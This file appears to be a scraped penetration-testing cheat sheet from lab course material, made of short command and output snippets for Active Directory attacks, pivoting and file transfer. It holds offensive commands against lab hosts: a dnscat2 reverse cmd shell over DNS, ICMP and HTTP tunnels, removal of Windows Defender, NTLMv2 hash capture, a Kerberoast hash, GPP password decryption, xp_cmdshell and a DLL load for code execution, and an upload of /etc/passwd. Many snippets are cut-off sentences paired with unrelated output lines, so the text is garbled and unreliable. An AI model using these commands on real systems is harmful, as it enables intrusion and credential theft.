## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - using-netshexe-to-port-forward
#cat/UTILS #cpts
```
C:\Windows\system32> netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - verifying-port-forward
#cat/UTILS #cpts
```
C:\Windows\system32> netsh.exe interface portproxy show v4tov4
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - starting-the-dnscat2-server
#cat/UTILS #cpts
```
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - starting-the-dnscat2-server-2
#cat/UTILS #cpts
```
./dnscat --secret=0ec04a91cd1e963f8c03ca499d589d21 inlanefreight.local
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - starting-the-dnscat2-server-3
#cat/UTILS #cpts
```
./dnscat --dns server=x.x.x.x,port=53 --secret=0ec04a91cd1e963f8c03ca499d589d21
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - importing-dnscat2ps1
#cat/UTILS #cpts
```
Import-Module .\dnscat2.ps1
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - importing-dnscat2ps1-2
#cat/UTILS #cpts
After dnscat2.ps1 is imported, we can use it to establish a tunnel with the server running on our attack host. We can send back a CMD shell session to our server.

```
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - confirming-session-establishment
#cat/UTILS #cpts
```
(the security depends on the strength of your pre-shared secret!)
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - confirming-session-establishment-2
#cat/UTILS #cpts
We can list the options we have with dnscat2 by entering ? at the prompt.

```
dnscat2> ?
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - interacting-with-the-established-session
#cat/UTILS #cpts
```
dnscat2> window -i 1
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - interacting-with-the-established-session-2
#cat/UTILS #cpts
```
(c) 2019 Microsoft Corporation. All rights reserved.
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - building-ptunnel-ng-with-autogensh
#cat/UTILS #cpts
```
sudo ./autogen.sh
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - alternative-approach-of-building-a-static-binary
#cat/UTILS #cpts
```
sudo apt install automake autoconf -y
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - alternative-approach-of-building-a-static-binary-2
#cat/UTILS #cpts
```
cd ptunnel-ng/
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - alternative-approach-of-building-a-static-binary-3
#cat/UTILS #cpts
```
sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - alternative-approach-of-building-a-static-binary-4
#cat/UTILS #cpts
```
./autogen.sh
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - starting-the-ptunnel-ng-server-on-the-target-host
#cat/UTILS #cpts
```
:~/ptunnel-ng/src$ sudo ./ptunnel-ng -r10.129.202.64 -R22
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - starting-the-ptunnel-ng-server-on-the-target-host-2
#cat/UTILS #cpts
```
./ptunnel-ng: /lib/x86_64-linux-gnu/libselinux.so.1: no version information available (required by ./ptunnel-ng)
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - connecting-to-ptunnel-ng-server-from-attack-host
#cat/UTILS #cpts
```
sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - viewing-tunnel-traffic-statistics
#cat/UTILS #cpts
```
inf]: Incoming tunnel request from 10.10.14.18.
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - windows-defender
#cat/UTILS #cpts
```
Uninstall-WindowsFeature -Name Windows-Defender
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - fping
#cat/UTILS #cpts
[Fping](https://fping.org/) provides us with a similar capability as the standard ping application in that it utilizes ICMP requests and replies to reach out and interact with a host. Where fping shines is in its ability

```
fping -asgq 172.16.5.0/23
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - c-inveigh-inveighzero
#cat/UTILS #cpts
The PowerShell version of Inveigh is the original version and is no longer updated. The tool author maintains the C# version, which combines the original PoC C# code and a C# port of most of the code from the PowerShell

```
[ ] DHCPv6
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - c-inveigh-inveighzero-2
#cat/UTILS #cpts
As we can see, the tool starts and shows which options are enabled by default and which are not. The options with a \[+] are default and enabled by default and the ones with a [ ] before them are disabled. The running co

```
[.] [20:10:24] TCP(1433) SYN packet from 172.16.5.125:61310
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - c-inveigh-inveighzero-3
#cat/UTILS #cpts
After typing HELP and hitting enter, we are presented with several options:

```
SET CONSOLE | set Console parameter value
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - c-inveigh-inveighzero-4
#cat/UTILS #cpts
We can quickly view unique captured hashes by typing GET NTLMV2UNIQUE.

```
================================================= Unique NTLMv2 Hashes =================================================
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - c-inveigh-inveighzero-5
#cat/UTILS #cpts
We can type in GET NTLMV2USERNAMES and see which usernames we have collected. This is helpful if we want a listing of users to perform additional enumeration against and see which are worth attempting to crack offline us

```
=================================================== NTLMv2 Usernames ===================================================
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - example
#cat/UTILS #cpts
Now, students can kill the xfreerdp session, go back to Pwnbox/PMVPN, and save the hash into a file:

```
┌─[us-academy-1]─[10.10.14.61]─[htb-ac413848@pwnbox-base]─[~]
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - remediation
#cat/UTILS #cpts
Mitre ATT&CK lists this technique as ID: T1557.001, Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay. There are a few ways to mitigate this attack. To ensure that these spoofing attacks are not possible, we

```
$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - remediation-2
#cat/UTILS #cpts
Mitre ATT&CK lists this technique as ID: T1557.001, Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay. There are a few ways to mitigate this attack. To ensure that these spoofing attacks are not possible, we

```
Get-ChildItem $regkey | foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - netexe
#cat/UTILS #cpts
```
Force user logoff how long after time expires?: Never
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - error-account-is-disabled
#cat/UTILS #cpts
```
System error 1331 has occurred.
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - error-password-is-incorrect
#cat/UTILS #cpts
```
System error 1326 has occurred.
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - error-account-is-locked-out-password-policy
#cat/UTILS #cpts
```
System error 1909 has occurred.
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - spider_plus
#cat/UTILS #cpts
In the above command, we ran the spider against the Department Shares. When completed, CME writes the results to a JSON file located at /tmp/cme_spider_plus/<ip of host>. Below we can see a portion of the JSON output. We

```
head -n 10 /tmp/cme_spider_plus/172.16.5.5.json
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - get-domain-info
#cat/UTILS #cpts
```
AllowedDNSSuffixes : {}
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - get-ad-user-info
#cat/UTILS #cpts
```
DistinguishedName : CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - checking-for-trust-relationships
#cat/UTILS #cpts
```
Direction : BiDirectional
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - group-enumeration
#cat/UTILS #cpts
```
Print Operators
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - detailed-group-info
#cat/UTILS #cpts
```
DistinguishedName : CN=Backup Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - group-membership
#cat/UTILS #cpts
```
distinguishedName : CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - recursive-group-membership
#cat/UTILS #cpts
```
GroupDomain : INLANEFREIGHT.LOCAL
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - trust-enumeration
#cat/UTILS #cpts
```
SourceName : INLANEFREIGHT.LOCAL
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - testing-for-local-admin-access
#cat/UTILS #cpts
```
ComputerName IsAdmin
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - snaffler
#cat/UTILS #cpts
[Snaffler](https://github.com/SnaffCon/Snaffler) is a tool that can help us acquire credentials or other sensitive data in an Active Directory environment. Snaffler works by obtaining a list of hosts within the domain an

```
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - firewall-checks
#cat/UTILS #cpts
```
Domain Profile Settings:
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - windows-defender-check-from-cmdexe
#cat/UTILS #cpts
```
(STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - get-mpcomputerstatus
#cat/UTILS #cpts
```
AMEngineVersion : 1.1.19000.8
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - using-qwinsta
#cat/UTILS #cpts
```
SESSIONNAME USERNAME ID STATE TYPE DEVICE
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - user-search
#cat/UTILS #cpts
```
"CN=Administrator,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - computer-search
#cat/UTILS #cpts
```
"CN=ACADEMY-EA-DC01,OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL"
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - wildcard-search
#cat/UTILS #cpts
```
"CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - users-with-specific-attributes-set-passwd_notreqd
#cat/UTILS #cpts
```
distinguishedName userAccountControl
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - searching-for-domain-controllers
#cat/UTILS #cpts
```
sAMAccountName
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - enumerating-spns-with-setspnexe
#cat/UTILS #cpts
```
Checking domain DC=INLANEFREIGHT,DC=LOCAL
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - viewing-the-prepared-hash
#cat/UTILS #cpts
```
cat sqldev_tgs_hashcat
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - viewing-the-prepared-hash-2
#cat/UTILS #cpts
```
$krb5tgs$23$*sqldev.kirbi*$813149fb261549a6a1b4965ed49d1ba8$7a8c91b47c534bc258d5c97acf433841b2ef2478b425865dc75c39b1dce7f50dedcc29fc8a97aef8d51a22c5720ee614fcb646e28d854bcdc2c8b362bbfaf62dcd9933c55efeba9d77e4c6c6f524afee5c68dacfcb6607291a20cdfb0ef144055356a7296e33b440754be7f87754ac2e4858348e2aebb7270b2d345047f880e17acc07e27a8f752c372bc83a62d54208d12288893d32afd210191dd3b2c56797bd1a72e35a73a7820be51fbf277b83d8181fff5a05cf21481a7b462ceb01c3761c50952689ed1099827c17c2934131db71bc5142c589cd70ed2ebf57dca3f6226f3b21849529355414433210b8d7bd76fec4eb68a45deebc3e7cc931ed8769328536769123f5040d6771915cdbc6
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - viewing-the-contents-of-the-csv-file
#cat/UTILS #cpts
```
"SamAccountName","DistinguishedName","ServicePrincipalName","TicketByteHexStream","Hash"
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - enumerating-the-remote-desktop-users-group
#cat/UTILS #cpts
Privileged Access

```
ComputerName : ACADEMY-EA-MS01
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - enumerating-the-remote-management-users-group
#cat/UTILS #cpts
We can also utilize this custom `Cypher query` in BloodHound to hunt for users with this type of access. This can be done by pasting the query into the `Raw Query` box at the bottom of the screen and hitting enter. Code:

```
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - sql-server-admin
#cat/UTILS #cpts
More often than not, we will encounter SQL servers in the environments we face. It is common to find user and service accounts set up with sysadmin privileges on a given SQL server instance. We may obtain credentials for

```
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - viewing-our-options-with-access-to-the-sql-server
#cat/UTILS #cpts
Privileged Access

```
SQL> help
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - choosing-enable_xp_cmdshell
#cat/UTILS #cpts
Privileged Access

```
SQL> enable_xp_cmdshell
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - enumerating-our-rights-on-the-system-using-xp_cmdshell
#cat/UTILS #cpts
Privileged Access

```
xp_cmdshell whoami /priv
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - rce
#cat/UTILS #cpts
Tentative d'exécution de code

```
CREATE FUNCTION test RETURNS INT SONAME 'test.dll'
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - viewdns-results
#cat/UTILS #cpts
In the request above, we utilized `viewdns.info` to validate the IP address of our target. Both results match, which is a good sign. Now let's try another route to validate the two nameservers in our results. External Re

```
nslookup ns1.inlanefreight.com
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - credential-hunting
#cat/UTILS #cpts
[Dehashed](http://dehashed.com/) is an excellent tool for hunting for cleartext credentials and password hashes in breach data. We can search either on the site or using a script that performs queries via the API. Typica

```
sudo python3 dehashed.py -q inlanefreight.local -p
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - listing-compiling-options
#cat/UTILS #cpts
Initial Enumeration of the Domain

```
make help
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - adding-the-tool-to-our-path
#cat/UTILS #cpts
Initial Enumeration of the Domain

```
echo $PATH
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - scenario-2
#cat/UTILS #cpts
In the second assessment, I was faced with a similar setup, but enumerating valid domain users with common username lists, and results from LinkedIn did not yield any results. I turned to Google and searched for PDFs pub

```
for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - displaying-the-contents-of-ilfreightjson
#cat/UTILS #cpts
Enumerating & Retrieving Password Policies

```
cat ilfreight.json
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - checking-the-status-of-defender-with-get-mpcomputerstatus
#cat/UTILS #cpts
Enumerating Security Controls

```
AMEngineVersion : 1.1.17400.5
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - enumerating-language-mode
#cat/UTILS #cpts
Enumerating Security Controls

```
ConstrainedLanguage
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - using-find-lapsdelegatedgroups
#cat/UTILS #cpts
Enumerating Security Controls

```
OrgUnit Delegated Groups
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - using-find-admpwdextendedrights
#cat/UTILS #cpts
Enumerating Security Controls

```
ComputerName Identity Reason
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - using-get-lapscomputers
#cat/UTILS #cpts
Enumerating Security Controls

```
ComputerName Password Expiration
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - viewing-the-results
#cat/UTILS #cpts
Credentialed Enumeration - from Linux

```
20220307163102_computers.json 20220307163102_domains.json 20220307163102_groups.json 20220307163102_users.json
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - using-arp--a
#cat/UTILS #cpts
Living Off the Land

```
Interface: 172.16.5.25 --- 0x8
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - viewing-the-routing-table
#cat/UTILS #cpts
Living Off the Land

```
===========================================================================
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - adding-damundsen-to-the-help-desk-level-1-group-2
#cat/UTILS #cpts
ACL Abuse Tactics

```
VERBOSE: [Get-PrincipalContext] Using alternate credentials
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - creating-a-fake-spn
#cat/UTILS #cpts
ACL Abuse Tactics

```
VERBOSE: [Get-Domain] Extracted domain 'INLANEFREIGHT' from -Credential
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - workaround-1-pscredential-object
#cat/UTILS #cpts
If we RDP to the same host, open a CMD prompt, and type `klist`, we'll see that we have the necessary tickets cached to interact directly with the Domain Controller, and we don't need to worry about the double hop proble

```
Current LogonId is 0:0x1e5b8b
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - ensuring-impacket-is-installed
#cat/UTILS #cpts
```
[!bash!]$ python setup.py install
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - enumerating-for-ms-rprn
#cat/UTILS #cpts
```
[!bash!]$ rpcdump.py @172.16.5.5 | egrep 'MS-RPRN | MS-PAR'
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - creating-a-share-with-smbserverpy
#cat/UTILS #cpts
```
[!bash!]$ sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - creating-a-share-with-smbserverpy-2
#cat/UTILS #cpts
```
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - getting-the-system-shell-2
#cat/UTILS #cpts
```
(c) 2018 Microsoft Corporation. All rights reserved.
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - setting-the-krb5ccname-environment-variable
#cat/UTILS #cpts
The TGT requested above was saved down to the `dc01.ccache` file, which we use to set the KRB5CCNAME environment variable, so our attack host uses this file for Kerberos authentication attempts.

```
[!bash!]$ export KRB5CCNAME=dc01.ccache
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - running-klist
#cat/UTILS #cpts
```
[!bash!]$ klist
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - submitting-a-tgs-request-for-ourselves-using-getnthashpy
#cat/UTILS #cpts
We can also take an alternate route once we have the TGT for our target. Using the tool `getnthash.py` from PKINITtools we could request the NT hash for our target host/user by using Kerberos U2U to submit a TGS request

```
[!bash!]$ python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - submitting-a-tgs-request-for-ourselves-using-getnthashpy-2
#cat/UTILS #cpts
We can also take an alternate route once we have the TGT for our target. Using the tool `getnthash.py` from PKINITtools we could request the NT hash for our target host/user by using Kerberos U2U to submit a TGS request

```
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - confirming-the-ticket-is-in-memory
#cat/UTILS #cpts
```
Current LogonId is 0:0x4e56b
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - enumerating-for-ms-prn-printer-bug
#cat/UTILS #cpts
Miscellaneous Misconfigurations

```
ComputerName Status
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - viewing-the-contents-of-the-recordscsv-file
#cat/UTILS #cpts
Miscellaneous Misconfigurations

```
head records.csv
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - finding-a-password-in-the-script
#cat/UTILS #cpts
Miscellaneous Misconfigurations

```
Set oShell = CreateObject("WScript.Shell")
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - finding-a-password-in-the-script-2
#cat/UTILS #cpts
Miscellaneous Misconfigurations

```
Set Arg = WScript.Arguments
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - finding-a-password-in-the-script-3
#cat/UTILS #cpts
Miscellaneous Misconfigurations

```
Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - decrypting-the-password-with-gpp-decrypt
#cat/UTILS #cpts
Miscellaneous Misconfigurations

```
gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - enumerating-gpo-names-with-a-built-in-cmdlet
#cat/UTILS #cpts
Miscellaneous Misconfigurations

```
DisplayName
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - enumerating-domain-user-gpo-rights
#cat/UTILS #cpts
Miscellaneous Misconfigurations

```
ObjectDN : CN={7CA9C789-14CE-46E3-A722-83F4097AF532},CN=Policies,CN=System,DC=INLANEFREIGHT,DC=LOCAL
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - converting-gpo-guid-to-name
#cat/UTILS #cpts
Miscellaneous Misconfigurations

```
DisplayName : Disconnect Idle RDP
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - using-netdom-to-query-domain-trust
#cat/UTILS #cpts
Domain Trusts Primer

```
Direction Trusted\Trusting domain Trust type
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - using-netdom-to-query-domain-controllers
#cat/UTILS #cpts
Domain Trusts Primer

```
List of domain controllers with accounts in the domain:
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - using-netdom-to-query-workstations-and-servers
#cat/UTILS #cpts
Domain Trusts Primer

```
List of workstations with accounts in the domain:
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - confirming-a-kerberos-ticket-is-in-memory-using-klist
#cat/UTILS #cpts
Attacking Domain Trusts - Child -> Parent Trusts - from Windows

```
Current LogonId is 0:0xf6462
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - listing-the-entire-c-drive-of-the-domain-controller
#cat/UTILS #cpts
Attacking Domain Trusts - Child -> Parent Trusts - from Windows

```
Volume in drive \\academy-ea-dc01.inlanefreight.local\c$ has no label.
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - confirming-the-ticket-is-in-memory-using-klist
#cat/UTILS #cpts
Attacking Domain Trusts - Child -> Parent Trusts - from Windows

```
Current LogonId is 0:0xf6495
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - setting-the-krb5ccname-environment-variable-2
#cat/UTILS #cpts
Attacking Domain Trusts - Child -> Parent Trusts - from Linux

```
export KRB5CCNAME=hacker.ccache
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - accessing-dc03-using-enter-pssession
#cat/UTILS #cpts
Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows

```
[ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS C:\Users\administrator.INLANEFREIGHT\Documents> whoami
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - adding-inlanefreightlocal-information-to-etcresolvconf
#cat/UTILS #cpts
Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux

```
cat /etc/resolv.conf
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - viewing-the-protected-users-group-with-get-adgroup
#cat/UTILS #cpts
Hardening Active Directory

```
Description : Members of this group are afforded additional protections against authentication security threats.
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - viewing-the-pingcastle-help-menu
#cat/UTILS #cpts
Additional AD Auditing Techniques

```
switch:
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - pingcastle-interactive-tui
#cat/UTILS #cpts
Additional AD Auditing Techniques

```
2-conso -Aggregate multiple reports into a single one
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - pingcastle-interactive-tui-2
#cat/UTILS #cpts
Additional AD Auditing Techniques

```
5-export -Export users or computers
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - pingcastle-interactive-tui-3
#cat/UTILS #cpts
Additional AD Auditing Techniques

```
6-advanced -Open the advanced menu
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - scanner-options
#cat/UTILS #cpts
Additional AD Auditing Techniques

```
: .# Vincent LE TOUX (contact@pingcastle.com)
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - reporting
#cat/UTILS #cpts
Additional AD Auditing Techniques

```
Directory: C:\Tools\ADRecon-Report-20220328092458
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - confirming-the-md5-hashes-match
#cat/UTILS #cpts
Windows File Transfer Methods

```
Algorithm Hash Path
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - copy-a-file-from-the-smb-server
#cat/UTILS #cpts
Windows File Transfer Methods

```
1 file(s) copied.
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - copy-a-file-from-the-smb-server-2
#cat/UTILS #cpts
New versions of Windows block unauthenticated guest access, as we can see in the following command: Windows File Transfer Methods

```
You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - connecting-to-the-webdav-share
#cat/UTILS #cpts
Now we can attempt to connect to the share using the `DavWWWRoot` directory. Windows File Transfer Methods

```
Volume in drive \\192.168.49.128\DavWWWRoot has no label.
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - pwnbox---check-file-md5-hash
#cat/UTILS #cpts
```
md5sum id_rsa
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - connect-to-the-target-webserver
#cat/UTILS #cpts
```
exec 3/dev/tcp/10.10.10.32/80
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - pwnbox---start-web-server
#cat/UTILS #cpts
```
mkdir https && cd https
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - linux---creating-a-web-server-with-php
#cat/UTILS #cpts
```
php -S 0.0.0.0:8000
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - linux---creating-a-web-server-with-ruby
#cat/UTILS #cpts
```
ruby -run -ehttpd . -p8000
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - uploading-a-file-using-a-python-one-liner
#cat/UTILS #cpts
Let's divide this one-liner into multiple lines to understand each piece better. Code: python

```
file = open("/etc/passwd","rb")
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - from-dc01---confirm-winrm-port-tcp-5985-is-open-on-database01
#cat/UTILS #cpts
Miscellaneous File Transfer Methods

```
htb\administrator
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - from-dc01---confirm-winrm-port-tcp-5985-is-open-on-database01-2
#cat/UTILS #cpts
Miscellaneous File Transfer Methods

```
ComputerName : DATABASE01
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - upload-winini-to-our-pwnbox
#cat/UTILS #cpts
Living off The Land

```
Certificate Request Processor: The operation timed out 0x80072ee2 (WinHttp: 12002 ERROR_WINHTTP_TIMEOUT)
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - bits---server
#cat/UTILS #cpts
Detection

```
HEAD /nc.exe HTTP/1.1
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - using-ifconfig
#cat/UTILS #cpts
The Networking Behind Pivoting

```
ifconfig
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - using-ipconfig
#cat/UTILS #cpts
The Networking Behind Pivoting

```
Windows IP Configuration
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - routing-table-on-pwnbox
#cat/UTILS #cpts
The Networking Behind Pivoting

```
netstat -r
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - executing-the-payload-on-the-pivot-host
#cat/UTILS #cpts
Meterpreter Tunneling & Port Forwarding

```
:~$ ls
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - meterpreter-session-establishment
#cat/UTILS #cpts
Meterpreter Tunneling & Port Forwarding

```
meterpreter > pwd
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - running-clientpy-from-pivot-target
#cat/UTILS #cpts
Web Server Pivoting with Rpivot

```
:~/rpivot$ python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - windows-cmd---dir
#cat/UTILS #cpts
Interacting with Common Services

```
Volume in drive \\192.168.220.129\Finance has no label.
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - windows-cmd---dir-2
#cat/UTILS #cpts
